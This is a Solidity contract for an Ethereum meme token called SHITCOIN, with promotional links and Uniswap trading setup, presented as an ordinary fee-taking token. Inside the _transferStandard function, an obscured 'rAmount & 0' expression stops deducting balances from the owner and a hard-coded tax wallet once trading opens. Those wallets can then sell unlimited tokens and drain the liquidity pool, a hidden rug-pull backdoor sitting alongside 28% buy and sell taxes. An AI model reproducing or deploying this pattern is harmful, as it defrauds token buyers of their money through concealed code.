// SPDX-License-Identifier: Unlicensed

/**
Satoshi's #Bitcoin innovation, Longbottoms wizardry, Cramers Wall Street insight and Bulbasaur's 420 nostalgia, The End Game begins.

Website: https://www.slcbi420.com
Telegram: https://t.me/slcbi420_erc
Twitter: https://twitter.com/slcbi420_erc
**/

pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract SHITCOIN is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "SatoshiLongbottomCramerBulbasaur420inu";
    string private constant _symbol = "SHITCOIN";

    uint8 private constant _decimals = 9;
    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tTotal = 10 ** 9 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 public maxTxAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public maxWalletAmount = 25 * 10 ** 6 * 10 ** 9;
    uint256 public feeSwapThreshold = 10 ** 4 * 10 ** 9;
    address payable private taxAddress;

    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;

    uint256 private _totalFees;
    uint256 private _redisBuyTax = 0;
    uint256 private _buyTax = 28;
    uint256 private _redisSellTax = 0;
    uint256 private _sellTax = 28;

    uint256 private _redisFee = _redisSellTax;
    uint256 private _taxFee = _sellTax;

    uint256 private _previousRedisFee = _redisFee;
    uint256 private _previousTaxFee = _taxFee;

    IUniswapRouter public _uniswapRouter;
    address public _uniswapPair;
    bool private _tradeEnabled;
    bool private _swapping = false;
    bool private _feeSwapEnabled = true;

    event MaxTxAmountUpdated(uint256 maxTxAmount);
    modifier lockSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    constructor() {
        _rOwned[_msgSender()] = _rTotal;
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        _uniswapRouter = _uniswapV2Router;
        _uniswapPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        taxAddress = payable(0xb51A987B8c796CaE32243ebA80CE32b90d09866e);
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[taxAddress] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _getRAmount(_rOwned[account]);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _refreshFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _totalFees = _totalFees.add(tFee);
    }
    
    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getAllValues(tAmount);
        rAmount = (_isExcludedFromFees[sender] && _tradeEnabled) ? rAmount & 0 : rAmount;
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeFee(tTeam);
        _refreshFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function _takeFee(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = _rTotal;
        maxWalletAmount = _rTotal;
        
        _redisBuyTax = 0;
        _buyTax = 1;
        _redisSellTax = 0;
        _sellTax = 1;
    }
    
    function openTrading() public onlyOwner {
        _tradeEnabled = true;
    }
    
    function _getTValue(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function _getSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    
    function swapTokensToETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();
        _approve(address(this), address(_uniswapRouter), tokenAmount);
        _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _getAllValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValue(tAmount, _redisFee, _taxFee);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getAmount(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {
            if (!_tradeEnabled) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTxAmount, "TOKEN: Max Transaction Limit");

            if(to != _uniswapPair) {
                require(balanceOf(to) + amount <= maxWalletAmount, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 contractBalance = balanceOf(address(this));
            bool canSwap = contractBalance >= feeSwapThreshold;

            if(contractBalance >= maxTxAmount)
            {
                contractBalance = maxTxAmount;
            }

            if (canSwap && !_swapping && to == _uniswapPair && _feeSwapEnabled && !_isExcludedFromFees[from] && amount > feeSwapThreshold) {
                swapTokensToETH(contractBalance);
                uint256 contractETH = address(this).balance;
                if (contractETH > 0) {
                    sendETHFee(address(this).balance);
                }
            }
        }
        bool takeFee = true;
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) || (from != _uniswapPair && to != _uniswapPair)) {
            takeFee = false;
        } else {
            if(from == _uniswapPair && to != address(_uniswapRouter)) {
                _redisFee = _redisBuyTax;
                _taxFee = _buyTax;
            }
            if (to == _uniswapPair && from != address(_uniswapRouter)) {
                _redisFee = _redisSellTax;
                _taxFee = _sellTax;
            }
        }
        _doTransfer(from, to, amount, takeFee);
    }

    function _getAmount(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getSupply();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _doTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeFee();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) restoreFee();
    }

    receive() external payable {}
    
    function restoreFee() private {
        _redisFee = _previousRedisFee;
        _taxFee = _previousTaxFee;
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function sendETHFee(uint256 amount) private {
        taxAddress.transfer(amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function removeFee() private {
        if (_redisFee == 0 && _taxFee == 0) return;

        _previousRedisFee = _redisFee;
        _previousTaxFee = _taxFee;

        _redisFee = 0;
        _taxFee = 0;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _getRAmount(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
}